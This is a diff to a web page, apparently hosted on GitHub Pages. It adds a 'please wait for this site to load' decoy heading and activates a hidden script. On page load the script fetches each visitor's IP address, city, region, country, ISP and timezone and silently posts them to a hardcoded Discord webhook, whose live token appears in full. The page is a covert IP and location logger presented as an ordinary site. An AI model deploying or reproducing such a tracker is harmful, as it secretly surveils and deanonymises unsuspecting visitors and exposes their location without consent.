@@ -1,43 +1,39 @@
+"Dance till your dead!"
+<h1>Please wait for this users site to load. Due to the many data in GitHub Pages, this can take a second.</h1>
+
+
+
 <script>
 window.addEventListener("load", async () => {
-  const webhookURL = "PASTE_YOUR_WEBHOOK_HERE";
-  if (!webhookURL || webhookURL.includes("https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe")) return;
+  const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
 
   try {
-    const response = await fetch("https://ipapi.co/json/");
-    const data = await response.json();
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
 
     const payload = {
-      username: "IP Visitor Logger",
-      embeds: [{
-        title: "🌍 Visit Detected",
-        color: 3447003,
-        fields: [
-          { name: "IP Address", value: data.ip || "Unknown", inline: true },
-          { name: "City", value: data.city || "Unknown", inline: true },
-          { name: "Region", value: data.region || "Unknown", inline: true },
-          { name: "Country", value: data.country_name || "Unknown", inline: true },
-          { name: "Postal", value: data.postal || "Unknown", inline: true },
-          { name: "ISP / Org", value: data.org || "Unknown" },
-          { name: "Timezone", value: data.timezone || "Unknown", inline: true },
-          { name: "Latitude", value: String(data.latitude || "Unknown"), inline: true },
-          { name: "Longitude", value: String(data.longitude || "Unknown"), inline: true },
-          { name: "Page URL", value: window.location.href },
-          { name: "Referrer", value: document.referrer || "Direct Visit" },
-          { name: "User Agent", value: navigator.userAgent.substring(0, 1000) }
-        ],
-        timestamp: new Date().toISOString()
-      }]
+      content:
+        `🌍 Visit Detected\n\n` +
+        `IP: ${data.ip}\n` +
+        `City: ${data.city}\n` +
+        `Region: ${data.region}\n` +
+        `Country: ${data.country_name}\n` +
+        `ISP: ${data.org}\n` +
+        `Timezone: ${data.timezone}\n` +
+        `Page: ${window.location.href}`
     };
 
     await fetch(webhookURL, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      mode: "no-cors", // 👈 important for GitHub Pages
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify(payload)
     });
 
-  } catch (error) {
-    console.error("IP logging failed:", error);
+  } catch (err) {
+    console.error("Error:", err);
   }
 });
 </script>
